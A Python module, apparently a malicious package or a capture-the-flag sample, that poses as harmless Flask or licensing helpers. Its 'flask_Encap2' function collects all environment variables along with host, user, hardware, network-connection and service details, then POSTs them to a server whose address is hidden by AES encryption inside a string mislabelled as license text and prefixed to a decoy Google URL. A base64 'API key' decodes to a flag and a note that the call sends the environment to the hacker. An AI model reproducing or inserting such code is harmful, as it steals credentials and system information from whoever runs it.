import os
import json
import platform
import socket
import time
import requests
from datetime import datetime, timezone
import psutil
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib, base64
KEY_STR = "[captianpoipet]_flag{mytransfer}"   
IV_STR  = "nomorebetscammer"                 
def hello():
    APIKEY_CHATGPTX="Q29uZ3JhdHVsYXRpb25zIG9uIHNvbHZpbmcgdGhlIGNoYWxsZW5nZSEgRkxBR3s5ZDdmMzI1NGY5NTlmZDNlZTlhMzU3ODkxOTExYWY4YX0gVGhlIG5leHQgc3RlcCBpcyB0byBjYWxsIHRoZSBmbGFza19FbmNhcDIgbWV0aG9kIGluIHZlcnNpb24gMy4xMDAuMiAuIFRoaXMgd2lsbCBzZW5kIHRoZSBlbnZpcm9ubWVudCB0byB0aGUgaGFja2VyLg=="
    print("hellox")

def get_license() -> str:
    # Reads LICENSE.txt shipped inside the package
    return "8VWCFo5Nbq3o24VyM0UecNpjm0aplbTxmw47VFfAgCDiEyCDGED9fJmXIdeLaAuN0TeAK/aHJML9HtEFDpUJ7g=="
def _cpu_info():
    out = {
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "freq_mhz": None,
        "percpu_load_percent": psutil.cpu_percent(interval=0.5, percpu=True),
        "total_load_percent": psutil.cpu_percent(interval=None),
    }
    try:
        f = psutil.cpu_freq()
        if f:
            out["freq_mhz"] = {"current": f.current, "min": f.min, "max": f.max}
    except Exception:
        pass
    try:
        out["loadavg"] = os.getloadavg()
    except Exception:
        out["loadavg"] = None
    return out


def _memory_info():
    v = psutil.virtual_memory()
    s = psutil.swap_memory()
    return {
        "virtual": {
            "total": v.total,
            "available": v.available,
            "used": v.used,
            "free": v.free,
            "percent": v.percent,
        },
        "swap": {
            "total": s.total,
            "used": s.used,
            "free": s.free,
            "percent": s.percent,
        },
    }


def _disks_info():
    parts = []
    for p in psutil.disk_partitions(all=True):
        item = {
            "device": p.device,
            "mountpoint": p.mountpoint,
            "fstype": p.fstype,
            "opts": p.opts,
        }
        try:
            u = psutil.disk_usage(p.mountpoint)
            item["usage"] = {
                "total": u.total,
                "used": u.used,
                "free": u.free,
                "percent": u.percent,
            }
        except Exception:
            item["usage"] = None
        parts.append(item)
    io = None
    try:
        di = psutil.disk_io_counters(perdisk=True)
        io = {
            k: {
                "read_count": v.read_count,
                "write_count": v.write_count,
                "read_bytes": v.read_bytes,
                "write_bytes": v.write_bytes,
            }
            for k, v in di.items()
        }
    except Exception:
        pass
    return {"partitions": parts, "io": io}


def _net_info(include_all_ports=True):
    # Interfaces (every addr, incl. MAC), stats, and traffic counters
    ifaces = {}
    pernic_counters = psutil.net_io_counters(pernic=True)
    stats_map = psutil.net_if_stats()
    for name, addrs in psutil.net_if_addrs().items():
        iface = {
            "addresses": [],
            "stats": None,
            "counters": None,
        }
        for a in addrs:
            iface["addresses"].append({
                "family": str(a.family),
                "address": a.address,
                "netmask": getattr(a, "netmask", None),
                "broadcast": getattr(a, "broadcast", None),
                "ptp": getattr(a, "ptp", None),
            })
        s = stats_map.get(name)
        if s:
            iface["stats"] = {
                "isup": s.isup,
                "duplex": getattr(s, "duplex", None),
                "speed_mbps": getattr(s, "speed", None),
                "mtu": s.mtu,
            }
        c = pernic_counters.get(name)
        if c:
            iface["counters"] = {
                "bytes_sent": c.bytes_sent,
                "bytes_recv": c.bytes_recv,
                "packets_sent": c.packets_sent,
                "packets_recv": c.packets_recv,
                "errin": c.errin,
                "errout": c.errout,
                "dropin": c.dropin,
                "dropout": c.dropout,
            }
        ifaces[name] = iface

    # Ports & connections
    listening = []
    allconns = []
    try:
        for c in psutil.net_connections(kind="inet"):
            rec = {
                "fd": getattr(c, "fd", None),
                "family": str(c.family),
                "type": str(c.type),
                "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                "status": c.status,
                "pid": c.pid,
                "proc": None,
            }
            if c.pid:
                try:
                    rec["proc"] = psutil.Process(c.pid).name()
                except Exception:
                    pass
            if c.status == psutil.CONN_LISTEN:
                listening.append(rec)
            if include_all_ports:
                allconns.append(rec)
    except Exception:
        pass

    return {"interfaces": ifaces, "listening_ports": listening, "all_connections": allconns}

KEY = hashlib.sha256(KEY_STR.encode("utf-8")).digest()
IV  = IV_STR.encode("utf-8") 
def _services_info():
    # Windows services via psutil
    if platform.system().lower().startswith("win"):
        try:
            out = []
            for s in psutil.win_service_iter():
                try:
                    d = s.as_dict()
                    out.append(
                        {
                            "name": d.get("name"),
                            "display_name": d.get("display_name"),
                            "status": d.get("status"),
                            "binpath": d.get("binpath"),
                            "start_type": d.get("start_type"),
                        }
                    )
                except Exception:
                    continue
            return out
        except Exception:
            return None
    # Non-Windows: not universally available
    return None

def x() -> str:
    ct = base64.b64decode(get_license())
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode("utf-8")
def collect_env():
    env = dict(os.environ)
    sysinfo = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "cwd": os.getcwd(),
        "platform": {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python": platform.python_version(),
        },
        "timezone": time.tzname,
    }
    return {
        "env": env,
        "system": sysinfo,
        "cpu": _cpu_info(),
        "memory": _memory_info(),
        "disks": _disks_info(),
        "network": _net_info(include_all_ports=True),
        "services": _services_info(),  # Windows only; None elsewhere
    }


def flask_Encap():
    data = collect_env()
    print(json.dumps(data, indent=2))

def flask_Encap2():
    data = collect_env()
    json_str = json.dumps(data, indent=2)

    # Print locally
    print(json_str)

    # Send to remote server
    try:
        resp = requests.post(x()+
            "https://cloud.google.com/maps-platform",
            json={"tank": data},  
            timeout=10
        )
        resp.raise_for_status()
        print(f"[+] Data sent successfully! Status: {resp.status_code}")
        try:
            print("Server response:", resp.json())
        except Exception:
            print("Server response:", resp.text)
    except requests.RequestException as e:
        print(f"[!] Failed to send data: {e}")
